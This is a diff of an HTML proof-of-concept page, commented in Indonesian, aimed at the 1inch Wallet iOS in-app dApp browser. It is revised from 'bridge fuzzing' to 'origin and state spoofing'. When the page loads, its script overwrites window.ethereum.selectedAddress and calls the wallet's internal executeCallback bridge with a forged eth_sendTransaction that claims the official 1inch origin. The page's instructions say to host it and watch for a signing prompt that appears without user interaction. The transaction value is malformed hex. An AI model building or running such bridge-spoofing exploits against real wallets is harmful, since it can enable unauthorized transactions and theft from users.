@@ -2,10 +2,10 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>1inch Wallet Advanced Bridge Fuzzing PoC</title>
+    <title>1inch Wallet Origin & State Spoofing PoC</title>
     <script>
         function log(msg, color = "black") {
-            console.log("[PoC-v18] " + msg);
+            console.log("[PoC-v19] " + msg);
             const div = document.createElement('div');
             div.style.color = color;
             div.style.margin = "4px 0";
@@ -17,55 +17,71 @@
             document.body.prepend(div);
         }
 
-        // Fungsi untuk menguji eksekusi executeCallback dengan struktur objek transaksi valid
-        function testValidTransactionPayload() {
-            log("[*] Mempersiapkan struktur payload transaksi yang valid...", "blue");
+        // 1. Memalsukan status environment dApp agar dianggap berasal dari konteks yang sah
+        function spoofEnvironmentState() {
+            log("[*] Menyuntikkan status environment dan selectedAddress...", "blue");
+            
+            try {
+                if (window.ethereum) {
+                    // Paksa isi selectedAddress jika belum ada
+                    if (!window.ethereum.selectedAddress) {
+                        window.ethereum.selectedAddress = "0xDDf9d60E588acE13307ac1828d7DE211B4Ef949A";
+                    }
+                }
+            } catch (e) {}
+        }
+
+        // 2. Eksekusi callback dengan membungkus parameter lengkap termasuk origin/meta
+        function executeAdvancedBypass() {
+            spoofEnvironmentState();
+            log("[*] Mempersiapkan payload dengan parameter state lengkap...", "orange");
 
             if (window.OneInchIOSWallet && typeof window.OneInchIOSWallet.executeCallback === 'function') {
                 try {
-                    // Menyusun struktur argumen yang menyerupai parameter transaksi asli
-                    const validTxPayload = {
-                        id: Date.now(),
+                    // Mencoba variasi struktur dengan menyertakan metadata origin/sender
+                    const spoofedPayload = {
+                        id: Date.now() + 1,
                         name: "eth_sendTransaction",
+                        origin: "https://app.1inch.io", // Meniru origin resmi
                         object: {
                             method: "eth_sendTransaction",
                             params: [{
                                 from: "0xDDf9d60E588acE13307ac1828d7DE211B4Ef949A",
                                 to: "0x000000000000000000000000000000000000dead",
-                                value: "0x387371c63raw000", // Contoh nilai transfer
+                                value: "0x387371c63raw000",
                                 data: "0x"
                             }]
                         }
                     };
 
-                    log("[*] Mengirimkan payload terstruktur ke window.OneInchIOSWallet.executeCallback...", "orange");
-                    window.OneInchIOSWallet.executeCallback(validTxPayload);
-                    log("🚨 Berhasil mengeksekusi callback dengan payload terstruktur! Perhatikan layar HP Anda.", "#d00");
+                    log("[*] Mengirimkan spoofed payload ke executeCallback...", "blue");
+                    window.OneInchIOSWallet.executeCallback(spoofedPayload);
+                    log("🚨 Berhasil mengirimkan spoofed payload! Perhatikan layar HP Anda.", "#d00");
                 } catch (e) {
-                    log("[-] Gagal mengeksekusi payload: " + e.message, "gray");
+                    log("[-] Gagal mengirimkan spoofed payload: " + e.message, "gray");
                 }
             } else {
-                log("[-] window.OneInchIOSWallet.executeCallback tidak ditemukan.", "gray");
+                log("[-] window.OneInchIOSWallet.executeCallback tidak tersedia.", "gray");
             }
         }
 
         window.onload = function() {
-            log("=== PoC v18 Loaded ===");
-            setTimeout(testValidTransactionPayload, 2000);
+            log("=== PoC v19 Loaded ===");
+            setTimeout(executeAdvancedBypass, 2000);
         };
     </script>
 </head>
 <body style="padding:15px; font-family:Arial; background-color: #fff8f8;">
-    <h3 style="color: #c00; margin-top:0;">1inch Advanced Bridge Fuzzing PoC</h3>
-    <p style="color: #333; font-size: 13px;">Menguji apakah fungsi jembatan merespons struktur objek transaksi lengkap dan memicu jendela dialog penandatanganan.</p>
+    <h3 style="color: #c00; margin-top:0;">1inch Origin & State Spoofing PoC</h3>
+    <p style="color: #333; font-size: 13px;">Menguji bypass validasi origin dan state lingkungan dApp pada fungsi jembatan internal.</p>
     <hr style="border:0; border-top:1px solid #cc0000; margin:10px 0;">
     
     <div style="background: #fff; padding: 10px; border: 1px solid #ffcccc; border-radius: 4px; margin-top: 10px;">
-        <h4 style="margin: 0 0 8px 0; color: #990000;">Instruksi Pengujian:</h4>
+        <h4 style="margin: 0 0 8px 0; color: #990000;">Instruksi Pengujian v19:</h4>
         <ol style="margin: 0; padding-left: 20px; font-size: 13px; color: #444;">
-            <li>Unggah skrip ini ke server Anda yang dapat diakses melalui HTTPS.</li>
+            <li>Unggah kode ini ke server pengujian HTTPS Anda.</li>
             <li>Buka halaman melalui dApp browser aplikasi 1inch Wallet.</li>
-            <li>Amati apakah aplikasi tiba-tiba menampilkan pop-up konfirmasi transaksi (*signing prompt*) tanpa interaksi tombol dari Anda.</li>
+            <li>Amati apakah penambahan parameter *origin* dan *state spoofing* mampu memicu pop-up konfirmasi transaksi.</li>
         </ol>
     </div>
 </body>
